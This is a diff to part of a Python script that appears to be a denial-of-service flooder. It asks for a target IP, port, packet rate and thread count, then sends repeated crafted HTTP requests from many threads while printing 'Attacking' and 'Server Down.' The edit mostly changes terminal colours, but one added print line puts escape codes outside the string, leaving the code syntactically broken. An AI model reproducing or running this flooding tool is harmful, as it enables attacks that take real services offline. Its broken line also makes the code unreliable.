@@ -64,8 +64,8 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 
 ip = str(input("\033 [31m[+]\033[33m Target:\033[32m => \033[0m"))
 port = int(input("\033[31m[+]\033[33m Port:\033[32m => \033[0m"))
-pack = int(input("\033[31m[+]\033[33m Packet/s:\033[32m => \033[30m"))
-thread = int(input("\033[31m[+]\033[33m Threads:\033[32m => \033[30m"))
+pack = int(input("\033[31m[+]\033[33m Packet/s:\033[32m => \033[0m"))
+thread = int(input("\033[31m[+]\033[33m Threads:\033[32m => \033[0m"))
 
 def start():
     global useragents, ref, acceptall
@@ -86,10 +86,10 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+            print("\033[31m[+]\033[33m Attacking {0}:{1} |\033[32m Sent: {2}"\033[31m.format(str(ip),\033[34m int(port), xx))
         except:
             s.close()
-            print('[+] Server Down.')
+            print("\033[34m[+]\033[33m Server Down.")
 
 for x in range(thread):
     thred = threading.Thread(target=start)
